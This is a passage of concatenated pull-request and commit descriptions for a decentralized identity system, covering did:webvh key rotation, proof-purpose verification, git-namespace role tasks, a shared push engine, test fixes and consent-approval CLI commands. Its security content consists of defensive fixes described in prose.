- `keys/export-secret/0.1`, `keys/set-exportability/0.1` — attestation/update role keys are never exportable, whatever the authority.

### Security/privacy choices worth reviewing
- Approvals bind to a VTA-computed `previewId` (bound step-up per `auth/step-up/approve-request/0.3`, inline delivery); session elevation is not accepted. Keys are generated at preview time so the approver sees — and approves — the exact public key and document.
- Every entry under pre-rotation also rotates the update key; the preview states `updateKeyRotates` separately and the tasks are `destructive`.
- `notFound` for DIDs outside the caller's context (no existence oracle); `permissionDenied` only for callers who can already see the DID.
- Public projection withholds `staged`/`retiring`, schedules, custody, initiators, approvers and reasons.
- Revocation is deliberately easier to reach than addition for the attestation role.
- Revocation encoding (VTI-KEY-120 open issue) is proposed as: keep the method in `verificationMethod` with Data Integrity `revoked` = compromise time.

Schemas avoid `if/then` (typify cannot generate it); the conditional rules are stated in prose with task error codes. All four bindings regenerated; `npm run build`, `check-bindings`, `cargo build --workspace --all-targets`, TS build, Go build/vet and Dart analyze are clean; every example validates against its schema.

### Update 2
Per review: overlap made explicit and role-specific (conventions §11); `keys/migrate` and all legacy/grace-period text dropped (current deployments are recreated; pre-role DIDs are refused); `vtc/credentials/reissue/0.1` added for the compromise case.

Follow-up (not in this PR): `vta/webvh/dids/create/2.0` or a key-role DID-template kind, so new identities are key-role identities from their first entry.

Draft for design review — do not merge.

VTCs and VTNs provisioned on it), aligned with the VTI key-roles draft
(dtgwg-vti-spec#42): attestation, operational, messaging and update.

  auto-retire; fixes 1.0's Ed25519-only derivation, stale capability
  relationships and missing key records.

title: security(proof)!: check a proof's verificationMethod against its proofPurpose (#637)
body:
security(proof)!: check a proof's verificationMethod against its proofPurpose (#637)

* security(proof)!: check a proof's verificationMethod against its proofPurpose

The stock Verifier accepted a proof signed by any key listed under the
issuer's authentication or assertionMethod, whatever proofPurpose the proof
declared. It did not check that the verification method's controller was the
issuer. W3C Data Integrity requires both, through Controlled Identifiers
v1.0 §3.3.

- New ProofPurpose type (assertionMethod, authentication,
  capabilityInvocation, capabilityDelegation). Parsing refuses keyAgreement
  and unknown values.
- New ProofPurposeResolver trait resolves a verificationMethod for one
  purpose. CachedDidResolver implements it. It requires the resolved
  document's id and the method's controller to be the DID that names the
  method. It requires the method to be listed under the relationship the
  purpose names, by absolute DID URL, by a fragment relative to the
  document id, or embedded. DidKeyResolver implements it with did:key's
  implicit relationships: the key named `did:key:<id>#<id>` signs for all
  four purposes, and an X25519 did:key signs for none.
- Verifier resolves through a ProofPurposeResolver, so every proof is
  checked against its own purpose.
- New PurposeBound wraps a ProofPurposeResolver as an upstream
  VerificationMethodResolver bound to one proof's purpose. It is for
  callers of DataIntegrityProof::verify.
- sign_trust_task and ProofExt::sign default to proofPurpose authentication.
  They refuse a purpose that names no signing relationship.
- Resolver errors name the rule that failed. They carry no DID, document or
  key material.

BREAKING CHANGE:
- Verifier::with_resolver takes Arc<dyn ProofPurposeResolver>. Passing
  Arc::new(CachedDidResolver::new(..)) compiles unchanged. A custom
  key-only resolver must implement ProofPurposeResolver instead.
- CachedDidResolver no longer implements the purpose-unaware
  VerificationMethodResolver. Wrap it in PurposeBound::new(&resolver,
  ProofPurpose::parse(&proof.proof_purpose)?).
- A proof whose key is not listed under its proofPurpose, whose method is
  controlled by another DID, or whose purpose is keyAgreement or unknown
  now fails verification.
- The default signing purpose is authentication, not assertionMethod. The
  signing key must be listed under authentication, or the caller must
  pass with_proof_purpose.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(proof): a reference resolves only to a top-level verificationMethod

A method referenced under the proof purpose's relationship was also
looked up among methods embedded under other relationships, including
keyAgreement. A method embedded under a relationship is defined for that
relationship alone, so it is no longer reachable from another one.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* docs(specs): Trust Task document examples sign with proofPurpose authentication

The framework now recommends authentication for a Trust Task document's
proof and reserves assertionMethod for attestations. Update the
top-level document proofs in the per-task examples and the matching
non-normative notes.

Left unchanged: proofs on embedded credentials, vetting cards and
signed envelopes, and the specs whose normative text requires
assertionMethod (auth/step-up/approve-response 0.1-0.4, confirm/response
0.1, vault/sign-trust-task 0.1-0.2). Moving those needs new versions.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* chore(codegen): regenerate trust-tasks-rs for the updated spec examples

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* security(task-consent)!: a decision's proof is an assertionMethod attestation

A task-consent/decision is the approver's attestation, not an operational
message. The executors (the VTA, the VTC, the did-hosting RP's
verify_approval) and the approver devices (the mobile engine, the browser
wallet) already hold it to proofPurpose assertionMethod, with the key listed
under the approver's assertionMethod relationship. The previous commit on
this branch moved the decision example to authentication along with the
operational documents; restore it, and say so normatively.

- Producer: proofPurpose MUST be assertionMethod, with a verificationMethod
  listed under the approver's assertionMethod relationship.
- Consumer: MUST refuse a proof made for any other purpose, by a key not
  listed under assertionMethod, or by an approver DID it cannot resolve.
- The decision example signs for assertionMethod. Its response, an
  operational reply, stays authentication.
- Regenerate trust-tasks-rs for the example.

BREAKING CHANGE: a decision signed for authentication is refused.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: feat(git-ns/account/unlink): a member unlinks their own forge account (#636)
body:
feat(git-ns/account/unlink): a member unlinks their own forge account (#636)

* feat(git-ns/account/unlink): a member unlinks their own forge account

git-ns/account/link said a binding lasts "until the member unlinks or
leaves", but no task unlinked: the only way to drop an account was to
link another on the same forge, or to leave the community.

git-ns/account/unlink/0.1: a member names a forge (and, as a guard
against a re-link since, the account id they last read). The VTC
deletes the binding and anything joining the DID to the account,
revoking a binding credential if it issued one, then re-projects every
bridge-mode namespace on that forge. The account is in none of the new
desiredRoles, and under git-ns/bridge/job's rule that people not listed
lose any role the bridge manages, the bridge withdraws exactly the roles
it gave that account. The VTC does not use removeAccounts for this: a
role the bridge did not give was not given through the link, is
reported as drift, and is for the repository's owners to revert. The
audit record names the member and the forge, not the account.

Normal consent class, proof and issuedAt REQUIRED, one declared error
(notLinked). A community administrator unlinking another member's
account is left to a later version, and the spec says so.

git-ns/account/link/0.1 now names the new task where it speaks of
unlinking. Rust, TypeScript, Go and Dart bindings regenerated.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/account/unlink): the linked DID unlinks, and no answer reveals membership

The entitlement is being the DID the account is linked to, not current
membership: a member whose access lapsed still holds their link, which
projects nothing, and removing it is theirs to do. A caller with nothing
linked, a non-member included, is answered notLinked, so the refusal no
longer distinguishes members from non-members (it was permissionDenied).
Unlink is atomic with respect to link completion.

git-ns/account/link item 4 now says the one-account-one-member check
covers a member who has not left whatever their access, and must be
atomic with the recording against every other link and unlink.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: feat(git-ns): bridge/job 0.4 and namespace/reseat 0.3, a namespace admin gets no forge role (#635)
body:
feat(git-ns): bridge/job 0.4 and namespace/reseat 0.3, a namespace admin gets no forge role (#635)

* feat(git-ns): bridge/job 0.4 and namespace/reseat 0.3 — a namespace admin gets no forge role

A namespace admin exercises git.ns.admin through the VTC and its bridge,
never through a forge role: the bridge does not make them an owner of the
organisation and gives them no role on any repository for it.

git-ns/bridge/job 0.4:
- desiredRoles carries, per person, the highest right recorded in their
  own name on the repository (own, maintain or commit.sign there, or
  commit.sign on the namespace), never one held only because git.ns.admin
  implies it. A namespace admin with none is listed at git.ns.admin, which
  every adapter maps to no role, so the bridge takes off a role it manages
  that they still hold. An admin who is also a recorded owner is listed as
  the owner.
- Each forge account appears in desiredRoles at most once.
- repo is required for projectRoles: the namespace-level job, which only
  ever projected git.ns.admin as organisation owners, no longer exists.
- removeAccounts may name an account listed at git.ns.admin.
- A VTC must not send 0.4 to a bridge that has not shown it takes 0.4, and
  should read an unsupportedType or unsupportedVersion refusal as the
  bridge taking only earlier versions.

git-ns/namespace/reseat 0.3: step 8 no longer queues a namespace-level
forge projection. Wire-identical to 0.2.

Earlier versions are unchanged. Both are draft, so the breaking changes
ship as MINOR increments under the draft allowance of SPEC 5.2.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/bridge/job): 0.4 is sent only after discovery, never downgraded

A 0.3 bridge that reads later minor versions forward-compatibly would accept a 0.4 job and take git.ns.admin as ownership, so a VTC sends 0.4 only to a bridge that listed it in answer to trust-task-discovery, and a bridge that takes 0.4 answers one. A VTC does not fall back to an earlier version: it sends such a bridge nothing and tells its operator to upgrade it.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns/namespace/reseat): 0.3 refuses a reseat to yourself (separation of duties)

Reseating a headless namespace to the administrator who asks is a
self-grant of git.ns.admin, an elevated right. Under the separation-of-duties
rule of git-ns/right/grant 0.3 (#641) it is refused with
git-ns:selfGrantNotAllowed, checked before the members-only floor, and the
refusal names git-ns/right/break-glass as the explicit, audited way to do it.
0.2 said the subject may be the administrator themselves.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* spec(git-ns): ns.admin itself never projects a forge role; only own may map to admin

State that a namespace admin's own non-elevated rights still project, and
may be self-granted; that a bridge refuses a role map giving maintain or
commit.sign the forge admin role; that on a personal account own and
maintain both map to write, so separation of duties is enforced at the VTC.
Cite grant 0.3's fixed rules, and note that creator ownership implied only
by ns.admin does not arise under grant 0.3.

title: fix(vta-service)!: rotate webvh method keys in place with their own algorithms
body:
## Summary

`vta/webvh/dids/rotate-keys/1.0` (`rotate_did_webvh_keys`) now replaces the key behind every verification method **in place**. Each method keeps its id, its type and its algorithm. The VTA records the new keys, and retires the records they replace instead of deleting them.

## Defects confirmed and fixed

1. **Every method got an Ed25519 key.** Method keys were derived with `derive_webvh_keys`, which is the Ed25519 derivation used for webvh *authorization* keys. An X25519 key-agreement method was republished with an Ed25519 key, so nobody could encrypt to the DID afterwards. An ML-DSA method lost its algorithm. The algorithm now comes from the method's key record, which must hold the key the document publishes. The key is derived with the same `Bip32Extension` derivation that key custody uses when it later loads the key (VTI-KEY-012).
2. **Only three relationships were remapped.** Methods were renumbered to fresh `#key-N` ids, but only `authentication`, `assertionMethod` and `keyAgreement` were updated. `capabilityInvocation` and `capabilityDelegation` still named methods the document no longer carried. Ids are now preserved, so all five relationships stay valid. Methods embedded in a relationship array are rotated too.
3. **No key records were written for the new keys.** The published keys existed only as consumed path indices, so `keys/sign`, `keys/export-secret` and the VTA's own key loads could not find them. Each new key now gets an active record under its method id, with a derivation path under the DID's context base (VTI-KEY-030).
4. **`newScid` was always empty.** webvh carries `scid` only in the genesis entry's parameters, so every update reported `newScid: ""`. `rotate-keys/1.0` requires the response to report the existing SCID. The update result now does.

## Also checked

- **Old records** are kept as `{method id}@{versionId}` with status `revoked`. They record which key an id named at that version, and the VTA refuses to sign with them (VTI-KEY-042).
- **Non-exportable keys:** a replacement inherits `exportable: false`.
- **Internal keys:** a method backed by an internal key is refused. Replacing it with a derived key that the seed can reproduce would be weaker.
- **Pre-rotation** is still done by `update_did_webvh` (VTI-KEY-043). The tests assert that the commitment advances, and that `preRotationCount: 0` stops committing successors.
- **Crash safety:** the new keys' paths are staged as inert records before the entry is appended. `update_did_webvh_tracked` reports whether the local log write happened before an error. If it did not, the staged records are removed. If it did, the records are promoted, because the log already publishes the new keys. Staging ids are unique to each rotation.
- **Cancel safety:** the promotion (and, for the VTA's own DID, the live-resolver reload) runs in the same `tokio::spawn`ed task as the log write (`OnCommit`). A request future dropped after the write was issued (client hang-up, transport timeout) therefore cannot leave the published keys behind only revoked staging records. The live secrets are derived before the commit, so the spawned task needs no seed.
- **Boot recovery:** `recover_staged_rotations` runs in `build_app_state` before the VTA loads its own keys. It promotes every `@rotating-*` staging record whose key the DID's stored log currently publishes, retiring the record it replaces under the version that key was last current at. A staged key the log published and a later entry replaced is kept as that `@{versionId}` history record. Every other staging record is removed. It is idempotent. A record of another context, or an unreadable log, is logged and left for an operator.
- **Concurrency:** the rotation pins the version it read (`expected_version_id`). A concurrent update makes the rotation fail with `Conflict` before any record is promoted.
- **The VTA's own DID and the VTC's `vtc-host` DID.** Both nodes address their own keys by fixed ids:
  - the VTA uses `{vta_did}#key-0`, `#key-1` and `#sealed-transfer-0`;
  - the VTC uses `vtc_did#key-0` and `#key-1`.

  Because the old code renumbered methods, rotating either DID left that node unable to sign or decrypt as itself. Preserving ids fixes this by construction.

## Security review fixes

1. **Cross-context takeover (high).** Key records are addressed by method id. A `ctx-a` admin could define `<ctx-b DID>#key-0` in its own document and rotate. The rotation then read ctx-b's record and rewrote it under ctx-a. Now:
   - `validate_document_for_update` refuses a document that defines a method outside `{did}#`. A relationship may still reference another DID's method by string.
   - The rotation refuses a method outside the DID, and a record stored under another key id or in another context.
2. **Unstaging after the commit (high).** `update_did_webvh` writes the local log before it installs handles, stores the record and publishes. The rotation used to unstage its keys on any error, so a failed publish left published keys with no records. The commit point is now typed (`Commit::{NotCommitted, Committed}`), and the rotation promotes after it.
3. **Methods without records, and stale records.** A method the VTA holds no record for is left exactly as published; its algorithm is no longer guessed from the multicodec. A record whose public key differs from the document's refuses the rotation (realign first). A document with no VTA-held method is refused.
4. **Revoked and staging records** are refused by `get_key_secret_internal` and the VTA's own identity load (`find_vta_key_paths`). `get_key_secret`'s refusal of a key that is not active lives in #1733, which rewrites that function. This PR no longer carries its own copy of the check. `git merge-tree` of this branch onto `fix/vta-key-export-authz` is clean.

## Live reload after the VTA rotates its own DID

`rotate_did_webvh_keys` now takes the live secrets resolver. When the rotated DID is the VTA's own, it derives each rotated method key and replaces the resolver entry under its unchanged id once the entry is appended. REST, the Trust-Task spine and DIDComm all pass the resolver. The DIDComm and TSP legs therefore decrypt with the new key-agreement key immediately, and never sign with the retired key again (VTI-KEY-122). This is tested by `rotating_the_vtas_own_did_reloads_its_live_secrets`.

**Known limits, documented in `did-webvh-update.md`:**
- **No key-agreement overlap.** With in-place ids, the old and new key-agreement keys share one id, and the resolver holds one secret per id. A message encrypted to the retired key while still in transit fails to decrypt. The overlap in `feat/key-roles` VTI-KEY-122 needs the new key-agreement key under a new method id, and the VTA's and VTC's fixed `#key-1` addressing does not allow that yet. VTI-KEY-122's publish-before-use delay is also not met, since the new keys are used at once. Both belong with the key-roles work.
- **A VTC must not have its DID rotated yet.** The VTC derives its at-rest storage key (`vtc-storage-key/v1`), its audit key and its install-token key by HKDF from the `#key-0` Ed25519 seed. If it refetched rotated keys, it could no longer read its own encrypted state; if it keeps the old keys, it can neither decrypt nor be verified. The fix is to root those derivations in a key that does not rotate, which is a VTC change of its own. Until then the docs warn against rotating `vtc-host` DIDs.

## Spec

VTI-KEY-012, -020, -030 and -040..-043, and `vta/webvh/dids/rotate-keys/1.0`, are all consistent with this behaviour. No spec change is needed.

## Breaking / behaviour changes

- Rotation no longer mints new `#key-N` fragment ids and no longer advances `next_fragment_id`. `docs/02-vta/did-webvh-update.md` said fragment ids are monotonic; it now describes in-place rotation.
- A DID rotated by an earlier build may carry Ed25519 keys under X25519 or ML-DSA methods, stale capability references, and no records for its keys. The docs say to rotate it again, or repair it with `update`, after upgrading.
- Rotation now refuses DIDs that have internal-key methods, methods that have no `publicKeyMultibase`, methods outside the DID, records of another context and stale records. It leaves methods it holds no record for untouched.
- `update` refuses a document that defines another DID's verification method.
- A revoked key record is no longer loaded, even with `InternalAuthority`. With #1733 it is not exported either.
- `derive_webvh_keys` is removed; its only production caller was this function. Its tests now use `derive_webvh_keys_block`.

## Tests

- `vti_key_012_rotation_keeps_algorithms_ids_relationships_and_records` rotates a DID with Ed25519, X25519 and ML-DSA-44 methods. The methods are referenced from all five relationships, and one of them is non-exportable. It asserts:
  - ids and relationships are unchanged;
  - each new key has the same algorithm as the key it replaces;
  - each active record matches the published key, and its path is under the context base;
  - each retired record carries the old key;
  - no staging record is left over;
  - `exportable: false` is inherited;
  - a signature with the new key verifies against the published key;
  - the retired key is refused;
  - pre-rotation has advanced;
  - the chain validates and the SCID is unchanged.
- `rotation_with_pre_rotation_zero_stops_committing`
- `rotation_refuses_to_downgrade_an_internal_key`: nothing is published.
- `rotation_cannot_take_over_another_contexts_key_record`: a ctx-a admin adding `<ctx-b DID>#key-0` is refused at update, and a ctx-b record planted under a ctx-a method id is refused at rotation. ctx-b's record is unchanged.
- `rotation_skips_external_keys_and_refuses_stale_records`
- `rotation_committed_before_a_failed_publish_promotes_its_records`
- `a_revoked_key_is_not_loaded` (the export half is #1733's test)
- `the_post_commit_work_outlives_a_dropped_request`: an update's `OnCommit` work, held at a gate, finishes after the request future is dropped.
- `boot_recovery_promotes_a_published_staged_key_and_removes_the_rest`: a rotation is rewound to the post-crash state (old records active, new keys only staged, plus one never-published staging record). Recovery restores the promoted and retired records exactly, removes the orphan, and is a no-op the second time.
- The existing rotate tests and the key-custody census pass.

title: fix(vta-service)!: rotate webvh method keys in place with their own algorithms (#1734)
body:
fix(vta-service)!: rotate webvh method keys in place with their own algorithms (#1734)

* fix(vta-service): rotate webvh method keys in place with their own algorithms

rotate_did_webvh_keys derived every verification-method key with the
Ed25519 webvh authorization-key derivation, so X25519 and ML-DSA methods
were republished with Ed25519 keys (VTI-KEY-012); renumbered every
method and remapped only three relationships, leaving
capabilityInvocation and capabilityDelegation stale (VTI-KEY-020); and
wrote no key records, so the new keys could not be signed with or
exported.

Rotation now keeps each method's id and type and replaces its key with
one of the same algorithm, derived under the DID's context base
(VTI-KEY-030). Methods embedded in relationship arrays are rotated too.
Each new key gets an active record; the replaced record is retired as
{id}@{versionId} with status revoked (VTI-KEY-042). Non-exportable keys
stay non-exportable; internal keys are refused rather than downgraded.
New paths are staged before the append and promoted after it, and the
append pins the version it read.

Update results also report the DID's SCID: webvh carries it only in the
genesis entry, so newScid was always empty (rotate-keys/1.0, VTI-KEY-040).

BREAKING CHANGE: rotate-keys no longer mints new #key-N fragment ids or
advances next_fragment_id; method ids are preserved.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vta-service): reload the VTA's live keys when it rotates its own DID

After rotate-keys on the VTA's own DID the DIDComm and TSP legs kept the
retired secrets in memory until restart, so the VTA could not decrypt
anything encrypted to its new key-agreement key and kept signing with
the retired key (VTI-KEY-122: from the first use of the new key, never
sign with the retiring one).

rotate_did_webvh_keys now takes the live secrets resolver and, when the
rotated DID is the VTA's own, derives each rotated method key and
replaces the resolver entry under its unchanged method id, after the
entry is appended. All three transports pass the resolver.

Docs record the remaining limits: in-place ids leave no overlap for
in-transit messages to the retired key-agreement key, and a VTC's DID
must not be rotated while the VTC derives its storage keys from #key-0.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vta-service): confine webvh key rotation to the DID's own records

A context admin could pull another context's key record into its own DID
by defining `<other DID>#key-0` in its document and rotating: the rotation
read that record and rewrote it under the caller's context.

- validate_document_for_update refuses a document that defines a
  verification method outside `{did}#`.
- Rotation refuses a method outside the DID, a record stored under another
  key id or context, and a record whose public key differs from the one the
  document publishes. A method the VTA holds no record for is left as is.
- update_did_webvh_tracked reports whether the log entry was committed.
  Rotation unstages its keys only before the commit and promotes them after
  it, so a failed publish no longer leaves published keys without records.
- Staging ids are unique per rotation.
- Revoked and staging records are refused by get_key_secret,
  get_key_secret_internal and the VTA's own identity load.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vta-service): realign-keys moves only active records of the DID's own context

realign-keys matched each published method to a key record by public key
across every context. A context admin could publish another context's
public key (the VTA's own included) as {did}#key-N and have the repair
rekey and delete that record.

The lookup now returns only an active record of the DID's own context, and
only methods under {did}# are considered. Anything else is reported as
unmatched. Regression test: another_contexts_key_is_never_moved.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vta-service): promote a published rotation's keys even when the request is dropped

The rotation promoted its staged key records in the request future, after
update_did_webvh returned. A client that hung up, or a transport timeout,
between the log write and the promotion left the published keys behind only
their revoked staging records: the DID's new keys existed in its log and
nowhere the VTA would sign or decrypt with.

- The orchestrator runs the log write and the caller's post-commit work
  (OnCommit) in one spawned task, so once the write is issued the promotion
  runs to completion whether or not the request is still waiting. The store's
  blocking write outlives a dropped future anyway; now so does what must
  follow it.
- rotate-keys hands its promotion and, for the VTA's own DID, the live
  resolver reload (secrets derived before the commit) to that task.
- recover_staged_rotations, run at boot before the VTA loads its own keys,
  promotes every @rotating-* staging record whose key the DID's stored log
  currently publishes (retiring the record it replaces under the version it
  was last current at), keeps one the log published and later replaced as
  that history record, and removes the rest.
- Tests: post-commit work outlives a dropped request; boot recovery promotes
  a published staged key, removes an unpublished one, and is idempotent.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vta-service): leave the export-surface revoked-key refusal to #1733

#1733 (fix/vta-key-export-authz) refuses a key that is not active in
get_key_secret, and tests it there. Carrying the same check here conflicted
with that branch's rewrite of the function. The get_key_secret_internal check
is identical in both and stays, as does its half of the test.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: refactor(vti-common): share the durable Trust Task push engine between nodes
body:
#1754 gave the VTC a push engine that picks TSP > DIDComm > REST by what the
recipient's DID document advertises. It records each push durably, queues one
outbox attempt per transport, settles on delivery evidence and escalates when
an attempt yields none (VTI-TRN-030, -040, -041, -042). The VTA's own pushes
(`consent_request::push_one`) are still best-effort TSP followed by DIDComm,
and to adopt the same model the engine has to live somewhere both nodes can
reach.

It moves unchanged to `vti_common::trust_task_push`. The node lends it what is
its own through a `PushContext`: the records keyspace, the outbox, the
resolver, its messaging handle and whether it can send TSP. The REST transport
takes its HTTP client, so each node supplies its foreign-fetch profile.
`vtc-service::member_push` is now that adapter, and its call sites are
unchanged.

The outbox transport ids keep their `member-push-*` values, so attempts queued
before an upgrade still drain after it. `vti-common`'s `tsp` feature now also
enables `affinidi-tdk/tsp` and `vta-sdk/tsp` for the TSP transport. That
exposed two items in `vta-sdk` gated on `tsp` but used only with `client`,
which are now gated on both.

The VTA moving onto the engine is a follow-up.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>
author: stormer78

title: test(vtc): give the relayed-request test a fresh resolver after its tamper check
body:
`vti_apv_014_a_relayed_request_is_answered_through_the_sdk` fails on main
with `ProofInvalid` on the VTC's own request.

The test preloads the VTC's DID document into a local cache, because
`TEST_VTC_DID` resolves nowhere, and checks a tampered request before the
genuine one. Since #1737, a verification that fails against a cached
document evicts it and resolves it fresh before refusing (VTI-KEY-134). So
the tamper check threw away the preloaded document, and the genuine request
that followed could not resolve its signer. #1737 and #1759 were each green
on their own; the failure appears only with both on main.

The behaviour is right, so the test changes: the genuine request is
verified with a fresh resolver.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>
author: stormer78

title: test(vta-sdk): a push attempt's idempotency key is not secret material
body:
main has been red since #1754. `secret_debug_census` flags `PushRecord.attempt_key` in `vtc-service/src/member_push.rs`, because the field name contains `key` in a type that derives `Debug`. The field is the outbox idempotency key of one push attempt, `<push id>:<attempt>:<transport>`, so it goes in `NOT_SECRET_EXACT` beside `idempotency_key` and `record_key`.

Renaming the field instead would change the stored record's shape and strand pushes in flight across an upgrade.

This fixes the `Test (workspace)` and `Feature combos` failures on main (both are this census). #1760 carries the identical line, so it rebases cleanly.

title: feat(pnm): answer this VTA's consent requests from the CLI
body:
A task under a `requires: consent` rule waits for its approver set, and only
a device enrolled for the task-consent push could answer. `pnm` showed the
requester the code and waited.

`pnm consent {show,approve,deny} <file|->` is the approver's side. It takes
the refusal the requester relays (the body, its `details`, or a bare request
document) and picks the request addressed to this profile. It checks that
this VTA signed it, that it is addressed to this approver and that it has
not expired. Approving requires typing the requester's match code, or
`--match-code`. The decision is dispatched as a Trust Task, which the client
signs with the profile's key under assertionMethod.

The operator-facing half is now shared with `cnm consent`: reading the
input, what is shown, the code comparison, the report and the refusal
hints, all in `vta_cli_common::consent_approve`. `cnm consent` moves onto
it, keeping its VTC-specific hint for `permissionDenied`.

Tested end to end in `delegated_consent_e2e`: a real VTA-signed request
verifies through `vta_sdk::task_consent`. It is refused when it is
addressed to someone else or has been tampered with, and the decision
built from it is granted.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: feat(cnm): answer the community's consent requests from the CLI (VTI-APV-014)
body:
Making or widening an unrestricted administrator at the VTC needs another
unrestricted administrator's consent (VTI-APV-014), but only a device
enrolled to handle the task-consent push could answer. An approver with a
cnm profile had no way to sign a decision.

`cnm consent {show,approve,deny} <file|->` takes the request the
requester relays (the refusal body, its `details`, or a bare request
document), picks the one addressed to this profile, and verifies it. The
VTC must have signed it, it must be addressed to this approver, and it
must not have expired. Approving requires typing the requester's match
code (or `--match-code`); a mismatch sends nothing. The decision is
signed with the profile's key under assertionMethod and posted to the
document endpoint.

The approver's shared half is a new `vta_sdk::task_consent` module:
`match_code`, `ConsentRequest::verify` returning a
`VerifiedConsentRequest` (the only type a decision can be built from),
and `decision`. `vtc-client` gains `decide_task_consent`.

It also fixes a mismatch between the two screens: the requester prompt
in `vta_cli_common::consent` printed the whole `zQm…` digest as the
"code", while approver devices show six hex characters of the decoded
digest. Both now call `vta_sdk::task_consent::match_code`, and so does
`vta-mobile-core`, which drops its copy.

Tested end to end in `unrestricted_admin_consent`: a real VTC-signed
request verifies through the SDK, is refused when it is addressed to
someone else, comes from another issuer, or has been tampered with, and
the decision built from it grants the consent.
